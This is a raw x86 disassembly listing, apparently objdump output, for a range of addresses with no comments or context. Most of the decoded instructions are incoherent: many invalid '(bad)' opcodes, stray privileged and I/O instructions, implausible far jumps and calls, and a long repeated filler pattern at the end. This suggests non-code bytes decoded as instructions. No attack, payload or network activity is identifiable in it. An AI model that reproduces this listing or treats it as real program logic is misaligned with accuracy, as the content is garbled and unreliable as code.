  44fba7:	outs   dx,DWORD PTR ds:[esi]
  44fba8:	leave  
  44fba9:	pop    es
  44fbaa:	(bad)  
  44fbab:	enter  0xfe0c,0x51
	...
  44fbc7:	add    BYTE PTR [edi-0x3f],bh
  44fbca:	sti    
  44fbcb:	push   eax
  44fbcc:	dec    esp
  44fbcd:	jae    0x44fbc9
  44fbcf:	call   FWORD PTR [ebx-0x79]
  44fbd2:	ret    
  44fbd3:	or     BYTE PTR [ebp-0x3f],bh
  44fbd6:	fisttp DWORD PTR [ebx+0x558428b9]
  44fbdc:	and    BYTE PTR [ebp+0x10b18b0e],cl
  44fbe2:	jl     0x44fba4
  44fbe4:	clc    
  44fbe5:	lea    eax,[edx-0xc]
  44fbe8:	jg     0x44fbb3
  44fbea:	jmp    0x44fb6f
  44fbec:	xor    eax,0x84d8700
  44fbf1:	das    
  44fbf2:	nop
  44fbf3:	mov    ebp,DWORD PTR [ecx-0x1f3d83dc]
  44fbf9:	lea    edx,[edx-0x20]
  44fbfc:	or     eax,0xfbfff90a
  44fc01:	mov    fs,edx
  44fc03:	pop    ebp
  44fc04:	mov    bh,0x49
  44fc06:	retf   
  44fc07:	int3   
  44fc08:	inc    ecx
  44fc09:	mov    gs,ebx
  44fc0b:	adc    eax,0xd
  44fc0e:	push   0xffc4f7f0
  44fc13:	(bad)  
  44fc14:	jmp    0xf488f1cd
  44fc19:	mov    eax,DWORD PTR [edx-0x8]
  44fc1c:	dec    esp
  44fc1d:	sbb    esp,edi
  44fc1f:	aas    
  44fc20:	hlt    
  44fc21:	lea    eax,[edx-0x8]
  44fc24:	inc    esp
  44fc25:	sub    eax,0x1aabfd39
  44fc2a:	jl     0x44fbf0
	...
  44fc44:	add    ah,ch
  44fc46:	mov    eax,DWORD PTR [edx-0x4]
  44fc49:	outs   dx,DWORD PTR ds:[esi]
  44fc4a:	enter  0x510f,0x7f
  44fc4e:	mov    al,0xb
  44fc50:	push   edx
  44fc51:	jg     0x44fc13
  44fc53:	pop    es
  44fc54:	push   eax
  44fc55:	xor    DWORD PTR [eax-0x476e7405],0xffffffbc
  44fc5c:	int3   
  44fc5d:	inc    eax
  44fc5e:	dec    ecx
  44fc5f:	retf   
  44fc60:	int3   
  44fc61:	ror    DWORD PTR [ebp+0x1f90a1eb],0x3c
  44fc68:	add    BYTE PTR [edx],dh
  44fc6a:	add    eax,0x60e98b68
  44fc6f:	cmc    
  44fc70:	inc    ebx
  44fc71:	hlt    
  44fc72:	mov    ecx,DWORD PTR [edi+0x1]
  44fc75:	xchg   BYTE PTR [esi-0x79],al
  44fc78:	push   eax
  44fc79:	icebp  
  44fc7a:	mov    bh,0xbc
  44fc7c:	int3   
  44fc7d:	inc    eax
  44fc7e:	dec    ecx
  44fc7f:	retf   
  44fc80:	int3   
  44fc81:	ror    DWORD PTR [ebp+0x91083eb],0x9f
  44fc88:	mov    al,ds:0x8affc61e
  44fc8d:	es (bad) 
  44fc8f:	(bad)  
  44fc90:	ds jg  0x44fc58
  44fc93:	das    
  44fc94:	mov    esp,DWORD PTR [esi]
  44fc96:	mov    cs,ebp
  44fc98:	outs   dx,DWORD PTR ds:[esi]
  44fc9a:	int    0xb
  44fc9c:	mov    eax,esi
  44fc9e:	mov    ecx,DWORD PTR [edx-0xc]
  44fca1:	jg     0x44fc62
  44fca3:	repz mov ebp,DWORD PTR [ecx+ecx*1]
  44fca7:	xchg   DWORD PTR [ebp+0x0],ecx
	...
  44fcc2:	fmul   QWORD PTR [ebp-0x508207ae]
  44fcc8:	sti    
  44fcc9:	mov    eax,0x4f5
  44fcce:	jns    0x44fd14
  44fcd0:	jae    0x44fd16
  44fcd2:	ja     0x44fc6b
  44fcd4:	test   DWORD PTR [eax],0xc02d0129
  44fcda:	lahf   
  44fcdb:	fadd   DWORD PTR [ebp+ecx*2+0x184e8d9c]
  44fce2:	fild   QWORD PTR [edi-0x72128af9]
  44fce8:	inc    edx
  44fce9:	clc    
  44fcea:	jg     0x44fcb3
  44fcec:	or     ecx,DWORD PTR [ecx+0x5584f92c]
  44fcf2:	jl     0x44fc81
  44fcf4:	inc    edx
  44fcf5:	adc    BYTE PTR [ebp-0x3a],bh
  44fcf8:	pop    ss
  44fcf9:	mov    eax,0x4f5
  44fcfe:	dec    edi
  44fcff:	cld    
  44fd00:	test   BYTE PTR [ebp+0x5c],cl
  44fd03:	lea    ecx,[esi]
  44fd05:	mov    DWORD PTR [ecx+0x4c45841c],ebp
  44fd0b:	fld    QWORD PTR [edx-0x4]
  44fd0e:	leave  
  44fd0f:	add    BYTE PTR ds:0xe5004fc0,ch
  44fd15:	mov    bl,0xe7
  44fd17:	inc    esp
  44fd18:	test   ch,ah
  44fd1a:	leave  
  44fd1b:	inc    ebp
  44fd1c:	retf   
  44fd1d:	int3   
  44fd1e:	xor    BYTE PTR [eax-0x35],cl
  44fd21:	int3   
  44fd22:	sub    BYTE PTR [eax-0x35],cl
  44fd25:	int3   
	...
  44fd3e:	add    BYTE PTR [eax+0x48],al
  44fd41:	retf   
  44fd42:	int3   
  44fd43:	mov    eax,ds:0x1083eb8d
  44fd48:	cld    
  44fd49:	rol    BYTE PTR [ebp-0x4],0x3
  44fd4d:	xor    BYTE PTR [eax],al
  44fd4f:	hlt    
  44fd50:	lods   al,BYTE PTR ds:[esi]
  44fd51:	add    eax,DWORD PTR [esp+esi*1]
  44fd54:	add    eax,0xc4de8c9f
  44fd59:	dec    DWORD PTR [edi-0x34]
  44fd5c:	mov    ah,0xfb
  44fd5e:	call   ebx
  44fd60:	test   bl,al
  44fd62:	or     BYTE PTR [ebp-0x3e],bh
  44fd65:	repz push 0x34
  44fd68:	mov    WORD PTR [edx-0x8],cs
  44fd6b:	and    eax,0xae6c128c
  44fd70:	(bad)  
  44fd71:	dec    DWORD PTR [edx+0x6a4fb536]
  44fd77:	hlt    
  44fd78:	pop    ss
  44fd79:	push   edx
  44fd7a:	hlt    
  44fd7b:	push   edi
  44fd7c:	mov    eax,ds:0x83f443f5
  44fd81:	cmp    ah,BYTE PTR [esi+ecx*4-0x3c]
  44fd85:	(bad)  
  44fd86:	dec    DWORD PTR [ecx]
  44fd88:	add    BYTE PTR [eax+0x4f402],bh
  44fd8e:	jmp    0x44fd6e
  44fd90:	mov    ecx,DWORD PTR [edx]
  44fd92:	add    bh,dh
  44fd94:	(bad)  
  44fd95:	dec    DWORD PTR [eax+0x6714b1]
  44fd9b:	pop    esp
  44fd9c:	add    al,0x0
  44fd9e:	push   0x4003f4
	...
  44fdbb:	add    BYTE PTR [edi-0xe],bh
  44fdbe:	arpl   dx,di
  44fdc0:	mov    bh,0x4
  44fdc2:	jg     0x44fd86
  44fdc4:	hlt    
  44fdc5:	add    eax,DWORD PTR [eax]
  44fdc7:	add    dh,al
  44fdc9:	sub    al,0x99
  44fdcb:	(bad)  
  44fdcc:	sub    ebx,DWORD PTR [eax]
  44fdce:	jl     0x44fd94
  44fdd0:	lock pop esp
  44fdd2:	inc    DWORD PTR [edx]
  44fdd4:	mov    ah,0x4
  44fdd6:	sub    eax,DWORD PTR [eax]
  44fdd8:	test   DWORD PTR [eax+eax*1],0xf5a0f98b
  44fddf:	inc    ebx
  44fde0:	hlt    
  44fde1:	jmp    0x44fdaa
  44fde3:	mov    ecx,ebp
  44fde5:	jo     0x44fddc
  44fde7:	inc    ebx
  44fde8:	hlt    
  44fde9:	mov    edx,DWORD PTR [edx]
  44fdeb:	xchg   esp,eax
  44fdec:	out    dx,al
  44fded:	ret    
  44fdee:	call   DWORD PTR [ecx-0x6b]
  44fdf1:	mov    al,ds:0xb4f443f5
  44fdf6:	test   BYTE PTR [ebp-0x3c],cl
  44fdf9:	mov    ch,0xe7
  44fdfb:	popf   
  44fdfc:	enter  0xf817,0x83
  44fe00:	mov    eax,0x50158508
  44fe05:	sbb    edi,DWORD PTR [eax+eax*1]
  44fe08:	div    DWORD PTR [ecx+0x2d418907]
  44fe0e:	test   BYTE PTR [ebp-0x74],dl
  44fe11:	pop    ss
  44fe12:	fisttp QWORD PTR [ebx-0x3343466f]
  44fe18:	ror    BYTE PTR [eax-0x35],0xcc
  44fe1c:	and    DWORD PTR [ebx+ebp*8+0x8b],ecx
	...
  44fe37:	add    BYTE PTR [eax],al
  44fe39:	cmp    DWORD PTR ds:0x93e84535,ecx
  44fe3f:	add    BYTE PTR [ebx+0x5e50cb9],cl
  44fe45:	pop    edi
  44fe46:	add    eax,DWORD PTR [ebp-0x43460fbb]
  44fe4c:	int3   
  44fe4d:	sub    BYTE PTR [eax-0x35],cl
  44fe50:	int3   
  44fe51:	inc    eax
  44fe52:	dec    eax
  44fe53:	retf   
  44fe54:	int3   
  44fe55:	mov    eax,ds:0x5083eb8b
  44fe5a:	call   0x47d441f
  44fe5f:	and    BYTE PTR [esp+esi*8],al
  44fe62:	mov    eax,DWORD PTR [edx+0x8]
  44fe65:	jge    0x44fe28
  44fe67:	xlat   BYTE PTR ds:[ebx]
  44fe68:	mov    esi,DWORD PTR [ecx-0x13aa7bc4]
  44fe6e:	add    ecx,DWORD PTR [edi+0x3c]
  44fe71:	jge    0x44fe24
  44fe73:	fisttp WORD PTR [ebx-0x48f7db4f]
  44fe79:	lods   al,BYTE PTR ds:[esi]
  44fe7a:	lock test BYTE PTR [ebp+0x14],dl
  44fe7e:	mov    DWORD PTR [ebx+0xa],eax
  44fe81:	or     al,0x8c
  44fe83:	inc    edx
  44fe84:	call   0x4048efe5
  44fe89:	hlt    
  44fe8a:	mov    DWORD PTR [edx],ecx
  44fe8c:	mov    esi,ds
  44fe8e:	ret    0x50ff
  44fe91:	fadd   st(6),st
  44fe93:	hlt    
  44fe94:	dec    ebx
  44fe96:	add    bl,0x8
  44fe99:	ins    DWORD PTR es:[edi],dx
  44fe9a:	shr    bh,0x6a
	...
  44feb5:	add    BYTE PTR [ebp*4+0x4f42fff],dh
  44febc:	push   0xd400
  44fec1:	push   0xfffffff4
  44fec3:	adc    eax,0xc06df052
  44fec8:	jecxz  0x44fe55
  44feca:	sub    DWORD PTR ds:0xb5204284,esp
  44fed0:	test   BYTE PTR [ebp-0x14],cl
  44fed3:	mov    bl,0x84
  44fed5:	push   ebp
  44fed6:	nop
  44fed7:	mov    bl,0xe7
  44fed9:	shl    DWORD PTR [ecx+0x16],0xf8
  44fedd:	xor    DWORD PTR [eax],0x9
  44fee0:	rol    DWORD PTR [ebp+0x68],0x5
  44fee4:	add    BYTE PTR [eax],al
  44fee6:	hlt    
  44fee7:	sub    DWORD PTR [esi],eax
  44fee9:	mov    edi,DWORD PTR [ecx-0xa3f83f0]
  44feef:	mov    eax,DWORD PTR [edx-0xc]
  44fef2:	outs   dx,DWORD PTR ds:[esi]
  44fef3:	enter  0xfdf,0x83
  44fef7:	mov    ah,0x1
  44fef9:	cmp    ecx,ecx
  44fefb:	adc    BYTE PTR [ecx+ebx*2+0x7f],ch
  44feff:	shl    bh,0x83
  44ff02:	pushf  
  44ff03:	lock push DWORD PTR [ebx-0x4f]
  44ff07:	mov    DWORD PTR [edx-0x18],ecx
  44ff0a:	ja     0x44fea8
  44ff0c:	sldt   WORD PTR [eax+0xc5584d8]
  44ff13:	mov    bh,BYTE PTR ds:0xdfc86f10
  44ff19:	mov    eax,DWORD PTR [eax]
	...
  44ff33:	inc    ebp
  44ff34:	(bad)  [edx-0x7be9fbbc]
  44ff3a:	dec    ebp
  44ff3b:	aam    0xd1
  44ff3d:	int    0xf7
  44ff3f:	fld    DWORD PTR gs:[ebp+edx*2+0x42a905d4]
  44ff47:	or     BYTE PTR [ebp-0x7633ba7c],dh
  44ff4d:	dec    edx
  44ff4e:	or     bh,dh
  44ff50:	int3   
  44ff51:	adc    edx,DWORD PTR [ecx+0x7f]
  44ff54:	scas   eax,DWORD PTR es:[edi]
  44ff55:	out    0x8b,eax
  44ff57:	xor    DWORD PTR [ecx],esp
  44ff59:	cld    
  44ff5a:	inc    ecx
  44ff5b:	lock mov ah,0xe7
  44ff5e:	push   ebp
  44ff5f:	cdq    
  44ff60:	adc    eax,0x8b883f8
  44ff65:	test   DWORD PTR [ebp-0x64],ecx
  44ff68:	cmp    DWORD PTR [esi-0x183892d8],0x528966eb
  44ff72:	in     al,0xc6
  44ff74:	sub    al,0x9
  44ff76:	cld    
  44ff77:	imul   edx,DWORD PTR ds:0xacf8c47c,0x23
  44ff7e:	add    al,0xb4
  44ff80:	add    al,0x9f
  44ff82:	mov    WORD PTR [esi-0x3f],cs
  44ff85:	dec    DWORD PTR [edi+0x5c]
  44ff88:	mov    ebp,esi
  44ff8a:	inc    DWORD PTR [ebx-0x7f]
  44ff8d:	ret    
  44ff8e:	or     BYTE PTR [ebp-0x41],ch
  44ff91:	fild   DWORD PTR [ebx+0x43f58cf1]
	...
  44ffaf:	add    ah,dh
  44ffb1:	add    al,0x73
  44ffb3:	or     ch,BYTE PTR [edi+0x7]
  44ffb6:	cmp    dl,0xb7
  44ffb9:	add    al,0x4f
  44ffbb:	jmp    FWORD PTR [ecx+0x7c3d7c38]
  44ffc1:	sbb    bh,BYTE PTR [eax+eax*1]
  44ffc4:	hlt    
  44ffc5:	(bad)  
  44ffc6:	sbb    ebp,DWORD PTR [edx-0x4c]
  44ffc9:	lods   al,BYTE PTR ds:[esi]
  44ffca:	jmp    FWORD PTR [edi]
  44ffcc:	hlt    
  44ffcd:	add    al,0x85
  44ffcf:	push   ebp
  44ffd0:	call   0xd48a848c
  44ffd5:	add    BYTE PTR [edi+0x34],0x45
  44ffd9:	adc    al,0x52
  44ffdb:	lock xchg edi,eax
  44ffdd:	test   eax,0x1ff443f5
  44ffe2:	adc    ch,BYTE PTR [edx+0x34]
  44ffe5:	popf   
  44ffe6:	jmp    FWORD PTR [edi]
  44ffe8:	hlt    
  44ffe9:	add    al,0x85
  44ffeb:	push   ebp
  44ffec:	mov    al,0xb7
  44ffee:	add    BYTE PTR gs:[ebx+0x18a3efba],ch
  44fff5:	(bad)  
  44fff7:	add    BYTE PTR [edi-0x2e],dh
  44fffa:	arpl   dx,di
  44fffc:	aaa    
  44fffd:	add    eax,0x9ee17500
  450002:	aas    
  450003:	push   0xffffd4f4
  450008:	outs   dx,DWORD PTR ds:[esi]
  450009:	retf   0x50fb
  45000c:	fiadd  WORD PTR [ecx+edi*8]
  45000f:	push   ebp
  450010:	fs push 0xfa63
	...
  45002a:	add    BYTE PTR [eax],al
  45002c:	add    BYTE PTR [edi+0x504d8504],dh
  450032:	jle    0x45007e
  450034:	fdivr  DWORD PTR [edi-0x46]
  450037:	xlat   BYTE PTR ds:[ebx]
  450038:	mov    esi,DWORD PTR [ecx+0x41fc2c]
  45003e:	jle    0x450082
  450040:	loopne 0x4500b1
  450042:	ret    0x8bdf
  450045:	lds    esi,FWORD PTR [ebp+ecx*2+0x4f28b18b]
  45004c:	mov    esi,ecx
  45004e:	test   al,0xf5
  450050:	inc    ebx
  450051:	hlt    
  450052:	mov    ch,0xe7
  450054:	xchg   ecx,eax
  450055:	adc    BYTE PTR [eax+edi*8],dl
  450058:	xor    DWORD PTR [eax],0x1
  45005b:	test   DWORD PTR [ebp+0x14],edx
  45005e:	mov    BYTE PTR [ebp+0x4f4a4],dh
  450064:	add    BYTE PTR [eax-0x32],ch
  450067:	test   BYTE PTR [ebp-0x2c],al
  45006a:	jg     0x4500b6
  45006c:	fdiv   st,st(7)
  45006e:	jl     0x45000f
  450070:	add    ah,dh
  450072:	add    al,0x87
  450074:	dec    ebp
  450075:	loopne 0x4500f6
  450077:	push   edx
  450078:	loopne 0x45000f
  45007a:	test   al,0xf5
  45007c:	inc    ebx
  45007d:	hlt    
  45007e:	fistp  QWORD PTR ds:0xf5789734
  450084:	inc    ebx
  450085:	hlt    
  450086:	jg     0x450092
  450088:	xchg   esp,eax
  450089:	scas   al,BYTE PTR es:[edi]
  45008a:	(bad)  
  45008b:	call   DWORD PTR [eax+0x6f]
  45008e:	stc    
  45008f:	arpl   dx,di
	...
  4500a9:	add    BYTE PTR [edi],dh
  4500ab:	add    eax,0x21398b4e
  4500b0:	dec    edi
  4500b1:	call   0x3d0fbe
  4500b6:	ja     0x450100
  4500b8:	or     ecx,DWORD PTR [ebx+0x15842529]
  4500be:	fmul   DWORD PTR [esi]
  4500c0:	cmp    al,0x0
  4500c2:	div    DWORD PTR [ebp+0x69098927]
  4500c8:	cmc    
  4500c9:	inc    ebx
  4500ca:	hlt    
  4500cb:	xchg   DWORD PTR [edx],edi
  4500cd:	mov    BYTE PTR [esi-0x39],cl
  4500d0:	(bad)  
  4500d1:	inc    ecx
  4500d3:	loopne 0x450073
  4500d5:	fs ds (bad) 
  4500d8:	dec    DWORD PTR [edi+0x6f]
  4500db:	add    DWORD PTR [edx+edi*8-0x74b0fb49],esp
  4500e2:	add    DWORD PTR [ebp-0x490bbc0b],eax
  4500e8:	out    0x75,eax
  4500ea:	sbb    BYTE PTR [ebx],dl
  4500ec:	clc    
  4500ed:	cmp    DWORD PTR [eax],0x0
  4500f0:	lahf   
  4500f1:	fs push cs
  4500f3:	(bad)  
  4500f4:	dec    DWORD PTR [edi+0xc]
  4500f7:	retf   
  4500f8:	idiv   bh
  4500fa:	sti    
  4500fb:	xchg   bl,al
  4500fd:	add    al,0xdf
  4500ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  450100:	addr16 xor al,0xf0
  450103:	(bad)  
  450104:	dec    DWORD PTR [edx+0x43f580f1]
  45010a:	hlt    
  45010b:	mov    bl,0xe7
  45010d:	push   ecx
	...
  450126:	add    ch,cl
  450128:	adc    bh,al
  45012a:	xor    DWORD PTR [eax-0x57ba7903],0x7e
  450131:	adc    ah,BYTE PTR [esi+edi*4-0x3a]
  450135:	call   DWORD PTR [ecx+0x7f]
  450138:	enter  0x8bdf,0xf9
  45013c:	test   al,0xf5
  45013e:	inc    ebx
  45013f:	hlt    
  450140:	add    eax,0x7e452848
  450145:	adc    al,BYTE PTR [eax+0x51ffc68e]
  45014b:	pushf  
  45014c:	fdivp  st(3),st
  45014e:	inc    DWORD PTR [ebx+0x550cc386]
  450154:	test   ebp,esi
  450156:	inc    ebx
  450157:	hlt    
  450158:	pop    es
  450159:	loopne 0x450152
  45015b:	test   DWORD PTR [ebx*4-0x39a154],0x4e0ca98c
  450166:	push   0xffffffb4
  450168:	sahf   
  450169:	add    DWORD PTR [ebx+0x43f560e1],ecx
  45016f:	hlt    
  450170:	mov    dh,0xf8
  450172:	push   ebp
  450173:	and    BYTE PTR ds:0x1233fbdd,bl
  450179:	mov    bh,0x1
  45017b:	hlt    
  45017c:	add    al,0x0
  45017e:	mov    ebx,DWORD PTR [ecx]
  450180:	mov    al,0xbd
  450182:	add    al,0xf4
  450184:	inc    eax
  450185:	retf   
  450186:	int3   
  450187:	inc    eax
  450188:	inc    ecx
  450189:	retf   
  45018a:	int3   
	...
  4501a3:	add    BYTE PTR [ecx-0x46741483],ah
  4501a9:	cld    
  4501aa:	test   BYTE PTR [eax-0x8],al
  4501ad:	scas   eax,DWORD PTR es:[edi]
  4501ae:	mov    esp,0xcb40c0cc
  4501b3:	int3   
  4501b4:	inc    ecx
  4501b5:	jle    0x4501a2
  4501b7:	push   ebx
  4501b8:	dec    edx
  4501b9:	mov    edx,0xf643d84
  4501be:	cmp    al,0x0
  4501c0:	jg     0x4501b1
  4501c2:	jnp    0x4501be
  4501c4:	aaa    
  4501c5:	add    eax,0xf4c3585
  4501ca:	cmp    al,0x0
  4501cc:	sbb    esi,DWORD PTR [ebx+0x40b75d54]
  4501d2:	retf   
  4501d3:	int3   
  4501d4:	inc    ecx
  4501d5:	jle    0x4501c2
  4501d7:	push   ecx
  4501d8:	or     al,0xc9
  4501da:	add    eax,DWORD PTR [eax-0xc]
  4501dd:	arpl   WORD PTR [ebx+0x500537fa],cx
  4501e3:	call   0x3d0e40
  4501e8:	ja     0x450232
  4501ea:	pop    es
  4501eb:	mov    DWORD PTR [ecx],esi
  4501ed:	adc    DWORD PTR [ebp+ecx*2+0x65b3fc],eax
  4501f4:	jg     0x4501ed
  4501f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4501f7:	cli    
  4501f8:	mov    bh,0x4
  4501fa:	dec    esi
  4501fb:	inc    ecx
  4501fd:	adc    BYTE PTR [ebp+eiz*8-0x3334ba4f],al
  450204:	mov    eax,ds:0x83eb7d
	...
  450221:	push   eax
  450222:	call   0x48147e7
  450227:	add    BYTE PTR [eax],al
  450229:	hlt    
  45022a:	dec    ecx
  45022b:	inc    edx
  45022c:	fsubr  QWORD PTR [esp+eax*1-0x38c50000]
  450233:	repz add esp,esi
  450236:	add    al,0x0
  450238:	(bad)  
  450239:	mov    ecx,0xf4ffff10
  45023e:	add    al,0xc1
  450240:	inc    ebp
  450241:	sbb    BYTE PTR [eax+eax*1],al
  450244:	add    ah,dh
  450246:	jge    0x450292
  450248:	or     BYTE PTR [ebp+0x2],bh
  45024b:	cmp    dl,0x37
  45024e:	add    eax,0x10eba9e8
  450253:	clc    
  450254:	mov    eax,ds:0x3c0b74
  450259:	sbb    DWORD PTR [eax],edx
  45025b:	clc    
  45025c:	add    ah,dh
  45025e:	cwde   
  45025f:	or     eax,edi
  450261:	stc    
  450262:	jl     0x450259
  450264:	inc    ebx
  450265:	hlt    
  450266:	add    al,0x0
  450268:	add    ah,dh
  45026a:	sbb    eax,DWORD PTR ds:0xf57cf1c7
  450270:	inc    ebx
  450271:	hlt    
  450272:	add    eax,0x83f40000
  450277:	cmp    al,BYTE PTR [eax-0x3b72]
  45027d:	add    ebx,edi
  45027f:	rol    BYTE PTR ds:0x3c0b6c,0x0
	...
  45029e:	hlt    
  45029f:	add    al,0x0
  4502a1:	add    BYTE PTR [edi-0x2e],dh
  4502a4:	xchg   edx,edi
  4502a6:	mov    bh,0x4
  4502a8:	add    BYTE PTR [ebp-0xf],dh
  4502ab:	call   0x43f5:0xb501feff
  4502b2:	hlt    
  4502b3:	arpl   WORD PTR [edi-0x6],di
  4502b6:	mov    bh,0x4
  4502b8:	test   DWORD PTR ds:0x3c0b74,ecx
  4502be:	ins    DWORD PTR es:[edi],dx
  4502bf:	ret    0x8be7
  4502c2:	or     DWORD PTR [ebp+0x7bf443f5],eax
  4502c8:	inc    edx
  4502c9:	call   0x8980c5c5
  4502ce:	mov    cl,0x1c
  4502d0:	test   BYTE PTR [ebp+0x1c],cl
  4502d3:	jle    0x4502df
  4502d5:	ins    BYTE PTR es:[edi],dx
  4502d6:	push   cs
  4502d7:	(bad)  
  4502d8:	jmp    DWORD PTR [edi-0x5c]
  4502db:	or     BYTE PTR [eax+0x0],al
  4502de:	sti    
  4502df:	stc    
  4502e0:	dec    edi
  4502e1:	cli    
  4502e2:	aaa    
  4502e3:	add    eax,0xc3ee8c9d
  4502e8:	inc    esi
  4502ea:	stc    
  4502eb:	jo     0x4502e2
  4502ed:	inc    ebx
  4502ee:	hlt    
  4502ef:	cdq    
  4502f0:	add    eax,DWORD PTR [eax-0xc]
  4502f3:	pushf  
  4502f4:	pop    edi
  4502f5:	add    al,0x34
  4502f7:	add    eax,0xa701585
  4502fc:	cmp    al,0x0
  4502fe:	es sbb eax,0xf7bd
	...
  450318:	add    BYTE PTR [eax],al
  45031a:	add    BYTE PTR [ebx-0x33b83f1],dh
  450320:	arpl   WORD PTR [edi-0x6fac806],dx
  450326:	adc    eax,0x3c0a7c
  45032b:	push   edi
  45032c:	pop    esp
  45032d:	cmc    
  45032e:	inc    ebx
  45032f:	hlt    
  450330:	gs fwait
  450332:	cli    
  450333:	aaa    
  450334:	add    eax,0xe40e850
  450339:	clc    
  45033a:	push   DWORD PTR [edi+0x48]
  45033d:	add    ecx,DWORD PTR [ecx+0x4d8414b1]
  450343:	fs mov ch,0xe7
  450346:	aad    0x5a
  450348:	psubb  mm0,QWORD PTR [ebx-0x7b62f7c8]
  45034f:	dec    esi
  450350:	ret    
  450351:	dec    DWORD PTR [edx+0x6a4d14a9]
  450357:	hlt    
  450358:	gs cmp edx,0xffffffb7
  45035c:	add    al,0x50
  45035e:	call   0x3d1aeb
  450363:	ja     0x4503ad
  450365:	or     ecx,DWORD PTR [ebx+0x4d8614a9]
  45036b:	adc    al,0x7b
  45036d:	push   edx
  45036e:	cld    
  45036f:	iret   
  450370:	mov    ecx,0x7b9e73ef
  450375:	inc    edx
  450376:	loopne 0x45031c
  450378:	jnp    0x4503c4
  45037a:	fadd   QWORD PTR [ebp+0x1d]
  45037d:	test   eax,0xfb
	...
  450396:	add    BYTE PTR [eax],al
  450398:	jmp    0x4503a8
  45039a:	jl     0x450360
  45039c:	in     al,dx
  45039d:	popa   
  45039e:	(bad)  
  45039f:	cli    
  4503a0:	aaa    
  4503a1:	add    eax,0xb641585
  4503a6:	cmp    al,0x0
  4503a8:	es fs fwait
  4503ab:	cli    
  4503ac:	aaa    
  4503ad:	add    eax,0xb5d044fd
  4503b2:	test   BYTE PTR ds:0x3c0b78,cl
  4503b8:	idiv   DWORD PTR [edi+0x368c51fb]
  4503be:	idiv   bh
  4503c0:	fwait
  4503c1:	add    bl,0xc
  4503c4:	jg     0x45037e
  4503c6:	repz add esp,DWORD PTR [ecx]
  4503c9:	xor    esp,edi
  4503cb:	push   esp
  4503cc:	cwde   
  4503cd:	jl     0x450421
  4503cf:	in     al,0x6f
  4503d1:	enter  0x3fb,0xb9
  4503d5:	xor    BYTE PTR [esi+0x4a7a6845],al
  4503db:	loopne 0x4503ec
  4503dd:	add    BYTE PTR [eax-0x78fb4806],dl
  4503e3:	dec    ebp
  4503e4:	push   esp
  4503e5:	sbb    bl,BYTE PTR [ecx-0xf34e39]
  4503eb:	push   esp
  4503ed:	add    al,0xe5
  4503ef:	or     DWORD PTR [edi-0x48],ebp
  4503f2:	test   DWORD PTR [ebx+0x55870936],0xf8427a2c
	...
  450414:	add    bh,bl
  450416:	(bad)  
  450417:	out    dx,eax
  450418:	jae    0x4503f6
  45041a:	jns    0x450426
  45041c:	test   BYTE PTR [esi],cl
  45041e:	ret    0x2ff
  450421:	mov    ecx,0xf711840c
  450426:	mov    bh,0xf7
  450428:	mov    eax,ds:0x3c0b70
  45042d:	test   edi,0x7a0489f7
  450433:	dec    edx
  450434:	clc    
  450435:	jne    0x45047a
  450437:	out    0x3,al
  450439:	hlt    
  45043a:	add    al,0x85
  45043c:	adc    eax,0x3c0a78
  450441:	div    DWORD PTR [edi+0x63ee33f7]
  450447:	cmp    edx,0x37
  45044a:	add    eax,0x7bac44fd
  45044f:	pop    es
  450450:	jmp    0x4504b5
  450452:	jnp    0x45047e
  450454:	je     0x4503f4
  450456:	sar    edi,0x88
  450459:	fst    DWORD PTR [ebp+esi*8-0x392e0bbd]
  450460:	mov    ecx,eax
  450462:	pushf  
  450463:	cmc    
  450464:	inc    ebx
  450465:	hlt    
  450466:	rol    esi,1
  450468:	mov    ecx,ebx
  45046a:	nop
  45046b:	cmc    
  45046c:	inc    ebx
  45046d:	hlt    
  45046e:	sbb    al,0x49
  450470:	imul   DWORD PTR [ebx+0xd]
  450473:	mov    cl,BYTE PTR ds:0x3c0b63
	...
  450491:	add    BYTE PTR [ebp-0x41],ch
  450494:	idiv   DWORD PTR [ecx+0x4001f4]
  45049a:	jne    0x4504b7
  45049c:	inc    DWORD PTR [edx]
  45049e:	hlt    
  45049f:	add    al,0x85
  4504a1:	push   ebp
  4504a2:	cmp    al,0xd9
  4504a4:	into   
  4504a5:	mov    DWORD PTR [ecx],ecx
  4504a7:	(bad)  
  4504a8:	cmc    
  4504a9:	inc    ebx
  4504aa:	hlt    
  4504ab:	arpl   WORD PTR [edi-0x6],si
  4504ae:	mov    bh,0x4
  4504b0:	push   eax
  4504b1:	call   0x3d0fa6
  4504b6:	ja     0x450500
  4504b8:	add    ecx,DWORD PTR [ebx+0x43f588f9]
  4504be:	hlt    
  4504bf:	mov    bl,0xe7
  4504c1:	aad    0xfe
  4504c3:	or     al,0xf8
  4504c5:	test   DWORD PTR [edx+edx*4+0x20b43303],esi
  4504cc:	and    eax,0xf591198b
  4504d1:	inc    ebx
  4504d2:	hlt    
  4504d3:	xchg   ebx,eax
  4504d5:	add    al,0x77
  4504d7:	retf   0xfa87
  4504da:	aaa    
  4504db:	add    eax,0x65ed7400
  4504e0:	arpl   dx,di
  4504e2:	aaa    
  4504e3:	add    eax,0xd84487
  4504e8:	call   0xf851ae4a
  4504ed:	mov    ecx,DWORD PTR [ecx]
  4504ef:	popa   
  4504f0:	cmc    
  4504f1:	inc    ebx
  4504f2:	hlt    
  4504f3:	mov    dh,0xbc
  4504f5:	xor    eax,DWORD PTR [eax]
	...
  45050f:	mov    ah,0x80
  450511:	loop   0x450570
  450513:	mov    bh,0x39
  450515:	retf   
  450516:	int3   
  450517:	hlt    
  450518:	add    al,0x0
  45051a:	add    ah,dh
  45051c:	add    al,0x0
  45051e:	add    ah,dh
  450520:	add    al,0x0
  450522:	add    ah,dh
  450524:	add    al,0x0
  450526:	add    ah,dh
  450528:	add    al,0x0
  45052a:	add    ah,dh
  45052c:	add    al,0x0
  45052e:	add    ah,dh
  450530:	add    al,0x0
  450532:	add    ah,dh
  450534:	add    al,0x0
  450536:	add    ah,dh
  450538:	add    al,0x0
  45053a:	add    ah,dh
  45053c:	add    al,0x0
  45053e:	add    ah,dh
  450540:	add    al,0x0
  450542:	add    ah,dh
  450544:	add    al,0x0
  450546:	add    ah,dh
  450548:	add    al,0x0
  45054a:	add    ah,dh
  45054c:	add    al,0x0
  45054e:	add    ah,dh
  450550:	add    al,0x0
  450552:	add    ah,dh
  450554:	add    al,0x0
  450556:	add    ah,dh
  450558:	add    al,0x0
  45055a:	add    ah,dh
  45055c:	add    al,0x0
  45055e:	add    ah,dh
  450560:	add    al,0x0
  450562:	add    ah,dh
